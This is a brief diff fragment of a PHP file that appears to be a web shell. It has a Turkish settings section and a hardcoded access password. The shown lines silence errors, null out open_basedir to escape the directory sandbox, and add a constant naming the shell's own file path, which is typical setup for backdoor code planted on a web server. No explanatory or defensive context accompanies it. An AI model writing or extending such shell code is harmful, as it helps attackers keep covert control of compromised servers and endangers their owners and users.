@@ -7,7 +7,9 @@
 @ini_set('display_errors', 0);
 @ini_set('open_basedir', NULL);
 @ini_set('memory_limit', '512M');
+defined('SHELL_FILE') or define('SHELL_FILE', __FILE__); 
 session_start();
+
 
 // ============== AYARLAR ==============
 $PASSWORD   = 'karamamba';
